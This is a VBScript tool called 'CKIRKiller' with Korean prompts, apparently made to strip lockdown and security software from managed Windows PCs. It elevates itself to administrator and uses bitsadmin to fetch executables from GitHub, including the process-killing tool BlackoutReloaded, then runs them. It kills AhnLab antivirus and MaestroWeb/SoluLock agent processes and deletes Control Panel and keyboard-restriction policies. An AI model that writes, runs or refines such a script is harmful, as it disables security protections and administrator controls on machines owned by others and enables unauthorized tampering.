' CKIRKiller Bootstrapper (No Korean characters to avoid encoding error)
Option Explicit

Dim fso, shell, stream, content, tempPath, app
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Check if already running in ANSI mode
If WScript.Arguments.Count = 0 Then
    tempPath = shell.ExpandEnvironmentStrings("%TEMP%\ck_ansi.vbs")
    
    On Error Resume Next
    ' Read current file as UTF-8
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.LoadFromFile WScript.ScriptFullName
    content = stream.ReadText
    stream.Close
    
    ' Save as ANSI (CP949)
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 2
    stream.Charset = "ks_c_5601-1987"
    stream.WriteText content
    stream.SaveToFile tempPath, 2
    stream.Close
    On Error GoTo 0
    
    ' Execute the fixed ANSI file as Admin
    Set app = CreateObject("Shell.Application")
    app.ShellExecute "wscript.exe", """" & tempPath & """ run", "", "runas", 1
    WScript.Quit
End If

' ------------------------------------------------------------
' ACTUAL LOGIC (This part runs only in ANSI environment)
' ------------------------------------------------------------

Dim oShell, oFSO, oWMI, oReg
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKEY_CURRENT_USER  = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const GitPath = "C:\Program Files\Git"
Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
Const MaestroDir = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"

' Step 1: 시작 질문
Dim nHancomRes
nHancomRes = MsgBox("한컴 입력기 제거도 같이 진행할까요?" & vbCrLf & _
                    "(메모장에 있는 코드를 복붙하는 귀찮은 과정이 포함됩니다.)" & vbCrLf & vbCrLf & _
                    "진행하려면 '예(Y)', 건너뛰려면 '아니오(N)'를 눌러주세요.", _
                    vbYesNo + vbQuestion, "CKIRKiller")

' Core Process (Git/Blackout)
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    oShell.Run "bitsadmin /transfer d /download /priority foreground """ & GitURL & """ ""C:\Windows\Temp\Git-Inst.exe""", 0, True
    oShell.Run """C:\Windows\Temp\Git-Inst.exe"" /VERYSILENT /NORESTART", 0, True
End If

If Not oFSO.FileExists(BlackoutExe) Then
    oShell.Run "bitsadmin /transfer d /download /priority foreground """ & BlackoutURL & """ ""C:\Windows\Temp\Blackout.exe""", 0, True
    oFSO.MoveFile "C:\Windows\Temp\Blackout.exe", BlackoutExe
End If

' Kill Processes
Dim arr, t
arr = Array("qukapttp.exe", "nfowjxyfd.exe", "lqndauccd.exe", "rwtyijsa.exe", "nhfneczzm.exe", "AYCWSSrv.ayc", "AYCRTSrv.ayc", "AYIASrv.exe", "AYCUpdSrv.ayc", "AYCMain.ayc", "AYCAgent.ayc", "AYCRTSrv.exe", "AYIASrv.exe", "Yoondisk_hd_recv.exe", "yoondisk_chplayer.exe", "MaestroWebSvr.exe", "MaestroWebAgent.exe", "SoluLock.exe")
For Each t In arr
    oShell.Run """" & BlackoutExe & """ " & t, 0, True
Next

' Unlock Policies
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage"
oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Keyboard Layout", "Scancode Map"

' Restart Explorer
On Error Resume Next
oShell.Run "taskkill /F /IM explorer.exe", 0, True
WScript.Sleep 1000
oShell.Run "explorer.exe", 0, False
On Error GoTo 0

' Step 2: 한컴 수동 안내 (Alert 우선 순위 조정)
If nHancomRes = vbYes Then
    Dim psFixTxt : psFixTxt = oFSO.GetSpecialFolder(2) & "\HancomFix_Guide.txt"
    Dim oT : Set oT = oFSO.CreateTextFile(psFixTxt, True)
    oT.WriteLine "=========================================================="
    oT.WriteLine "한컴 입력기 수동 최적화 가이드"
    oT.WriteLine "=========================================================="
    oT.WriteLine "1. 아래 5줄의 명령어를 복사(Ctrl+C)합니다."
    oT.WriteLine "2. PowerShell ISE 하단 입력창에 붙여넣기(Ctrl+V) 후 엔터."
    oT.WriteLine ""
    oT.WriteLine "$UserLanguageList = New-WinUserLanguageList -Language ""ko-KR"""
    oT.WriteLine "Set-WinUserLanguageList -LanguageList $UserLanguageList -Force"
    oT.WriteLine "Stop-Process -Name ""ctfmon"" -Force -ErrorAction SilentlyContinue"
    oT.WriteLine "Remove-Item -Path ""HKCU:\Software\Microsoft\CTF\SortOrder"" -Recurse -Force"
    oT.Write "Start-Process ""ctfmon.exe""" ' WriteLine 대신 Write를 사용하여 마지막 엔터 제거
    oT.Close
    
    oShell.Run "notepad.exe """ & psFixTxt & """", 1, False
    oShell.Run "powershell_ise.exe", 1, False
    
    ' 창들이 뜰 시간을 준 뒤, 가장 위로 오게 Alert 실행
    WScript.Sleep 800 
    MsgBox "메모장 가이드가 열렸습니다. 안내에 따라 코드를 복사해서 파란색 창(ISE)에 붙여넣어 주세요.", vbInformation + vbSystemModal, "Guide"
End If

' Step 3: 최종 완료 (잠시 쉬었다가 실행)
WScript.Sleep 500
Dim finalMsg
finalMsg = "모든 최적화 작업이 완료되었습니다!" & vbCrLf & _
           "제어판 및 Windows 키 해금을 적용하려면 로그아웃이 필요합니다." & vbCrLf & vbCrLf & _
           "필요하시면 작업 중인 문서를 모두 저장하시고 '예(Y)'를 눌러 로그아웃하세요. (로그아웃이라 데이터 안 날아감)"

If MsgBox(finalMsg, vbYesNo + vbInformation + vbSystemModal, "CKIRKiller") = vbYes Then
    oWMI.ExecQuery("Select * from Win32_OperatingSystem").ItemIndex(0).Win32Shutdown(4)
End If

WScript.Quit
